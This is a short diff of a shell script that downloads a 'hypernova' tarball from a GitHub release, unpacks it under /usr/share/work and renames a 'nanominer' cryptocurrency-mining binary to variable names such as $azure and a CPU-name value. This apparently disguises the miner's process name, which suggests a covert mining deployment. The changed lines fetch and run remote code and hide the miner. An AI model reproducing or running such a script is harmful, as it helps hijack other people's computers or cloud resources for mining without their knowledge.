@@ -12,8 +12,8 @@ mkdir /usr/share/work
 rm -r /usr/share/work/avengers
 wget https://github.com/wollfoo/wolethv100/releases/download/hypernova/hypernova.tar.gz
 mv avengers.tar.gz /usr/share/work/
-cd /usr/share/work/ &&  tar xf avengers.tar.gz
-rm -rf avengers.tar.gz && cd avengers
+cd /usr/share/work/ &&  tar xf hypernova.tar.gz
+rm -rf hypernova.tar.gz && cd hypernova
 mv nanominer $azure -n
 cp $azure "$cpuname"
 rm -f  nanominer
